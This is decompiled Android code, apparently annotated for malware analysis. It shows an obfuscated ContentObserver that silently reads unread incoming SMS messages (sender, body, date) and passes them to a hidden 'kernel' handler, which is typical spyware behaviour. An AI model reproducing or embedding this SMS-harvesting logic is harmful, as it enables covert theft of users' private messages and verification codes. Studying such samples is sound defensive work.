package a.d;

import a.a.b;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import bn.sdk.szwcsss.common.az.c.model.Cdo;
import cb.diy.usaly.UncmMes;
import com.google.gson.Bridge;
import com.google.gson.KernelInterface;
import com.umeng.analytics.a;
import java.util.ArrayList;
import java.util.HashMap;
/* loaded from: classes.dex */
public final class c extends ContentObserver {

    /* renamed from: a  reason: collision with root package name */
    private Context f496a;

    public c(Handler handler, Context context) {
        super(handler);
        this.f496a = context;
    }

    // [fmss] This method allows to read the content of SMSs and stores them in a list of type HashMap.
    @Override // android.database.ContentObserver
    public final void onChange(boolean z) {
        super.onChange(z);
        try {
            Cursor query = this.f496a.getApplicationContext().getContentResolver().query(Uri.parse(Cdo.e), null, "type = 1 and read = 0", null, null);
            if (query.getColumnCount() > 0) {
                boolean z2 = false;
                while (query.moveToNext()) {
                    z2 = true;
                    String string = query.getString(query.getColumnIndex("address"));
                    String string2 = query.getString(query.getColumnIndex(a.z)); // [fmss] a.z is the constant body
                    String string3 = query.getString(query.getColumnIndex("date"));
                    if (!b.a().b(string, string2)) {
                        b.a().a(string, string2);
                        ArrayList arrayList = new ArrayList();
                        HashMap hashMap = new HashMap();
                        hashMap.put("address", string);
                        hashMap.put(a.z, string2.replace("\"", "\\\""));
                        hashMap.put("date", string3);
                        arrayList.add(hashMap);
                        UncmMes.class.getSimpleName();
                        new StringBuilder().append(string).append("_").append(string2).append("_").append(string3);
                        KernelInterface kernel = Bridge.getInstant().getKernel();
                        if (kernel != null) {
                            kernel.handleMessage(a.e.a.a(arrayList));
                        }
                    }
                }
                if (!z2) {
                    b.b("1", this.f496a);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
